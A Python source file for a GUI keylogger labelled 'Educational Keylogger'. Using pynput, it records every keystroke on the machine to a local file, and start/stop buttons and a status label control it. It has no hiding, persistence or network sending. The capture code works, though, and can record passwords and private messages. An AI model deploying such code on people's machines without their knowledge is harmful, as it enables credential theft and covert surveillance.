import customtkinter as ctk
from pynput import keyboard
import threading
import os

# Configuration
LOG_FILE = "keylog.txt"

class KeyloggerApp(ctk.CTk):
    def __init__(self):
        super().__init__()

        # Window Setup
        self.title("Educational Keylogger")
        self.geometry("400x300")
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("blue")

        # Variables
        self.is_logging = False
        self.listener = None

        # GUI Elements
        self.label = ctk.CTkLabel(self, text="Keylogger Status: Stopped", font=("Arial", 16))
        self.label.pack(pady=20)

        self.start_button = ctk.CTkButton(self, text="Start Logging", command=self.start_logging)
        self.start_button.pack(pady=10)

        self.stop_button = ctk.CTkButton(self, text="Stop Logging", command=self.stop_logging, state="disabled")
        self.stop_button.pack(pady=10)

        self.info_label = ctk.CTkLabel(self, text=f"Logs will be saved to: {LOG_FILE}", font=("Arial", 10), text_color="gray")
        self.info_label.pack(side="bottom", pady=20)

    def on_press(self, key):
        """Callback function for pynput when a key is pressed."""
        try:
            k = str(key).replace("'", "")
            # Clean up common keys for readability
            if k == 'Key.space': k = ' [SPACE] '
            elif k == 'Key.enter': k = ' [ENTER]\n'
            elif k == 'Key.backspace': k = ' [BACKSPACE] '
            
            with open(LOG_FILE, "a") as f:
                f.write(k)
        except Exception as e:
            print(f"Error logging key: {e}")

    def run_logger(self):
        """Internal method to start the pynput listener."""
        with keyboard.Listener(on_press=self.on_press) as self.listener:
            self.listener.join()

    def start_logging(self):
        if not self.is_logging:
            self.is_logging = True
            self.label.configure(text="Keylogger Status: RUNNING", text_color="green")
            self.start_button.configure(state="disabled")
            self.stop_button.configure(state="normal")
            
            # Run the logger in a separate thread so the GUI doesn't freeze
            self.log_thread = threading.Thread(target=self.run_logger, daemon=True)
            self.log_thread.start()

    def stop_logging(self):
        if self.is_logging:
            self.is_logging = False
            self.label.configure(text="Keylogger Status: Stopped", text_color="white")
            self.start_button.configure(state="normal")
            self.stop_button.configure(state="disabled")
            
            if self.listener:
                self.listener.stop()

if __name__ == "__main__":
    app = KeyloggerApp()
    app.mainloop()